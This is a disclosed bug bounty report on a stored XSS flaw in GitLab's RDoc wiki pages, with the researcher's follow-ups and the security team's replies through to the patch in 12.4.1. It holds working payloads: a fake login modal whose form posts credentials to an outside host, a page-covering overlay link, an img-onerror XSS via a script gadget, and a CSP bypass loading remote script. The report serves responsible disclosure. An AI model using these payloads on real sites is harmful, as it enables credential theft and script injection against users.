title: Cross-site Scripting (XSS) - Stored in RDoc wiki pages

profile.name: GitLab
profile.about: A single application for the entire software development lifecycle.

vulnerability_information:
### Summary When creating an RDoc wiki page it's possible to use a large number of html tags and attributes that are normally sanitized, when creating a linkable image of the format `{}[link]` For example it is possible to specify a `class` attribute when creating an image link: ```rdoc { }[a] ``` will generate the following: ```html

Full Page link

``` This will place a link taking over the entire page and intercept any clicks, `atwho-view select2-drop-mask pika-select` are just some real classes that make the links position absolute with a high z-index. The `target` attribute could also be set to `_blank` and as there is no `rel="noopener"` [reverse tabnabbing](https://www.owasp.org/index.php/Reverse_Tabnabbing) is also possible. Another attack that is more likely to work would be to create a form in a modal, which could be used to ask for a username and password: ```rdoc a form {

Please Log In

}[/] ``` Which produces the following dialog when viewing the page: {F541421} ### Steps to reproduce 1. Create a wiki on gitlab 1. Add a new RDoc page with the above snippet 1. Save and wait for someone to click it ### Impact An attacker could trick a user into thinking they had clicked on a gitlab element when they are actually redirected to the attackers site, or be presented with a dialog that will post to an attackers site. ### Examples Example linking to a fake sign in form: https://gitlab.com/wbowling/wiki/wikis/home Example creating a modal form: https://gitlab.com/wbowling/wiki/wikis/home2 ### What is the current *bug* behavior? When using an image link in RDoc the anchor tag attributes are not sanitized correctly. ### What is the expected *correct* behavior? They should be correctly sanitized. ### Relevant logs and/or screenshots ### Output of checks This bug happens on GitLab.com #### Results of GitLab environment info ``` System information System: Ubuntu 16.04 Current User: git Using RVM: no Ruby Version: 2.6.3p62 Gem Version: 2.7.9 Bundler Version:1.17.3 Rake Version: 12.3.2 Redis Version: 3.2.12 Git Version: 2.21.0 Sidekiq Version:5.2.7 Go Version: unknown GitLab information Version: 12.1.1 Revision: f9abaa7d833 Directory: /opt/gitlab/embedded/service/gitlab-rails DB Adapter: PostgreSQL DB Version: 10.7 URL: http://gitlab-vm.local HTTP Clone URL: http://gitlab-vm.local/some-group/some-project.git SSH Clone URL: git@gitlab-vm.local:some-group/some-project.git Using LDAP: no Using Omniauth: yes Omniauth Providers: GitLab Shell Version: 9.3.0 Repository storage paths: - default: /var/opt/gitlab/git-data/repositories GitLab Shell path: /opt/gitlab/embedded/service/gitlab-shell Git: /opt/gitlab/embedded/bin/git ``` ## Impact Trick users into giving up their account details via a legitimate looking form on gitlab.com
vulnerability_information_html:
Summary

When creating an RDoc wiki page it's possible to use a large number of html tags and attributes that are normally sanitized, when creating a linkable image of the format {<img src>}[link]

For example it is possible to specify a class attribute when creating an image link:

{
<a href='https://aw.rs/users/signin' class='atwho-view select2-drop-mask pika-select'>
<img height=10000 width=10000></a>
}[a]

will generate the following:

<div class="md md-file">
  <p>Full Page link</p>
  <p><a href="a" rel="nofollow"></a><a href="https://aw.rs/users/signin" class="atwho-view select2-drop-mask pika-select" rel="nofollow"><img height="10000" width="10000"></a></p>
</div>

This will place a link taking over the entire page and intercept any clicks, atwho-view select2-drop-mask pika-select are just some real classes that make the links position absolute with a high z-index.

The target attribute could also be set to _blank and as there is no rel="noopener" reverse tabnabbing is also possible.

Another attack that is more likely to work would be to create a form in a modal, which could be used to ask for a username and password:

a form
{
<div class="modal show d-block">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<h3 class="page-title">Please Log In</h3>
</div>
<div class="modal-body">
<form class="new-wiki-page" action="http://aw.rs/">
<div class="form-group">
<label for="username"><span>Username</span></label>
<input type="text" name="username" id="username" class="form-control">
<label for="password"><span>Password</span></label>
<input type="password" name="password" id="password" class="form-control">
</div>
<div class="form-actions"><button name="button" type="submit" class="btn btn-success">Login</button></div>
</form>
</div>
</div>
</div>
</div>
}[/]

Which produces the following dialog when viewing the page:

Steps to reproduce

  1. Create a wiki on gitlab
  2. Add a new RDoc page with the above snippet
  3. Save and wait for someone to click it

Impact

An attacker could trick a user into thinking they had clicked on a gitlab element when they are actually redirected to the attackers site, or be presented with a dialog that will post to an attackers site.

Examples

Example linking to a fake sign in form:
https://gitlab.com/wbowling/wiki/wikis/home

Example creating a modal form:
https://gitlab.com/wbowling/wiki/wikis/home2

What is the current bug behavior?

When using an image link in RDoc the anchor tag attributes are not sanitized correctly.

What is the expected correct behavior?

They should be correctly sanitized.

Relevant logs and/or screenshots

Output of checks

This bug happens on GitLab.com

Results of GitLab environment info

System information
System:     Ubuntu 16.04
Current User:   git
Using RVM:  no
Ruby Version:   2.6.3p62
Gem Version:    2.7.9
Bundler Version:1.17.3
Rake Version:   12.3.2
Redis Version:  3.2.12
Git Version:    2.21.0
Sidekiq Version:5.2.7
Go Version: unknown

GitLab information
Version:    12.1.1
Revision:   f9abaa7d833
Directory:  /opt/gitlab/embedded/service/gitlab-rails
DB Adapter: PostgreSQL
DB Version: 10.7
URL:        http://gitlab-vm.local
HTTP Clone URL: http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:  git@gitlab-vm.local:some-group/some-project.git
Using LDAP: no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:    9.3.0
Repository storage paths:
- default:  /var/opt/gitlab/git-data/repositories
GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell
Git:        /opt/gitlab/embedded/bin/git

Impact

Trick users into giving up their account details via a legitimate looking form on gitlab.com

activities.message:
Hi @vakzz,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 14 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
activities.markdown_message:
Hi @vakzz,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 14 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team

After a bit more of a look it's possible to turn this into a stored XSS using the following:

{
<form class="gl-show-field-errors">
<input type="text" title="<img src=x onerror="alert(document.domain)">">
}[b]

This ends up in running the following from gl_field_error.js:

  this.errorMessage = this.inputElement.attr('title') || __('This field is required.');
  this.fieldErrorElement = $(`<p class='${errorMessageClass} hidden'>${this.errorMessage}</p>`);

Example at:
https://gitlab.com/wbowling/wiki/wikis/home3

Might need to change the report weakness from UI Redressing (Clickjacking) to Cross-site Scripting (XSS) - Stored and maybe update the severity (not sure where stored xss on the wiki falls)

activities.message:
Due to the XSS I've changed the above project to be private, let me know if you require access and I can add anyone as a member or provide and export.

Cheers,
Will

activities.message:
Hello @vakzz ,

Thank you for submitting this report.

We have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab-ce/issues/65335.  This issue will be made public 30 days following the release of a patch.

We will continue to update you via HackerOne as a patch is scheduled for release.

Best regards,
Costel
Security Team | GitLab Inc.

Would you be able to change this report from clickjacking to stored cross site scripting? I am unable to edit that section of the report.

Cheers,
Will

activities.message:
Hi @vakzz,

Just wanted to give you an update regarding this issue: In the previous security release there were several fixes for the XSS related issues. 
You can find more details here: 
https://gitlab.com/gitlab-org/gitlab-ce/issues/64033 -- to be public at the end of september.
https://gitlab.com/gitlab-org/gitlab-ce/issues/60143 
 
With these patches the XSS part of this report does not reproduce and we consider it as a duplicate. The engineering team is working on fixing the initial issue reported (rel="noopener").

We will keep you posted once a fix is released.

Regards,
Costel

Will

activities.message:
This may be fixed in https://gitlab.com/gitlab-org/gitlab-ce/issues/64033 if that is for an upcoming release (not sure until it's made public), but here are a few more details just in case. The vector only allows for safe elements and attributes to be added, but combining that with the script gadget in [gl_field_error.js](https://gitlab.com/gitlab-org/gitlab-ce/blob/master/app%2Fassets%2Fjavascripts%2Fgl_field_error.js#L66) allows it to be turned into an XSS (Similar to this talk https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf) The following HTML is generated by the POC posted above which is free from any XSS, but after [main.js#L329](https://gitlab.com/gitlab-org/gitlab-ce/blob/master/app/assets/javascripts/main.js#L329) is run it will become and XSS. ```html

``` https://gitlab.com/wbowling/wiki/wikis/home3 Cheers, Will
activities.markdown_message:
This may be fixed in https://gitlab.com/gitlab-org/gitlab-ce/issues/64033 if that is for an upcoming release (not sure until it's made public), but here are a few more details just in case.

The vector only allows for safe elements and attributes to be added, but combining that with the script gadget in gl_field_error.js allows it to be turned into an XSS (Similar to this talk https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)

The following HTML is generated by the POC posted above which is free from any XSS, but after main.js#L329 is run it will become and XSS.

<div class="md md-file">

<p><a href="b" rel="nofollow"> <form class="gl-show-field-errors"> <input type="text" title='<img src=x onerror="alert(document.domain)">'> </form></a></p>
</div>

https://gitlab.com/wbowling/wiki/wikis/home3

Cheers,
Will

activities.message:
Hi @gitlab_cmaxim,

Looking at https://gitlab.com/gitlab-org/gitlab-ce/issues/64033 now that is is public, I think this is a different issue? The supplied [POC at home3](https://gitlab.com/wbowling/wiki/wikis/home3) is still working on the latest version, but being blocked on gitlab.com due to the new: CSP rules `Content Security Policy: The page's settings blocked the loading of a resource at inline ("script-src"). home3:25:34643`

Cheers,
Will
activities.markdown_message:
Hi @gitlab_cmaxim,

Looking at https://gitlab.com/gitlab-org/gitlab-ce/issues/64033 now that is is public, I think this is a different issue? The supplied POC at home3 is still working on the latest version, but being blocked on gitlab.com due to the new: CSP rules Content Security Policy: The page's settings blocked the loading of a resource at inline ("script-src"). home3:25:34643

Cheers,
Will

activities.message:
I've added a version at https://gitlab.com/wbowling/wiki/wikis/home3b that includes a CSP bypass, although it does require the user to click anywhere on the page. The final RDoc payload is: ```RDoc {
}[#] ``` This creates the following html which is inserted via jQuery, creating a full screen link overlaying everything: ```html

``` This will cause `jquery-ujs` to fire an ajax request when clicked to our url (hosted on gitlab so it's allowed under the `self` policy of `script-src`), and end up running through `jQuery.globalEval(text, { nonce: getCspNonceValue() });` in [main.js#L53](https://gitlab.com/gitlab-org/gitlab-foss/blob/master/app%2Fassets%2Fjavascripts%2Fmain.js#L53) executing the payload. {F606367}
activities.markdown_message:
I've added a version at https://gitlab.com/wbowling/wiki/wikis/home3b that includes a CSP bypass, although it does require the user to click anywhere on the page. The final RDoc payload is:

{
<form class="gl-show-field-errors">
<input type="text" title="</p><a data-remote="true" data-method="get" data-type="script" href="https://gitlab.com/wbowling/wiki/raw/master/test.js" class='atwho-view select2-drop-mask pika-select'><img height=10000 width=10000></a>">
}[#]

This creates the following html which is inserted via jQuery, creating a full screen link overlaying everything:

</p>
<a 
  data-remote="true"
  data-method="get"
  data-type="script"
  href="https://gitlab.com/wbowling/wiki/raw/master/test.js"
  class='atwho-view select2-drop-mask pika-select'
>
  <img height=10000 width=10000>
</a>

This will cause jquery-ujs to fire an ajax request when clicked to our url (hosted on gitlab so it's allowed under the self policy of script-src), and end up running through jQuery.globalEval(text, { nonce: getCspNonceValue() }); in main.js#L53 executing the payload.

Costel 
GitLab Security Team

activities.message:
Hello @vakzz,

Thank you again for the report and retesting this! Your finding has been patched in GitLab version 12.4.1 and we are awarding a bounty. Congratulations! Your report will be published in 30 days in GitLab's issue tracker.

We look forward to your next report!

Best regards,
Costel
Security Team | GitLab Inc.
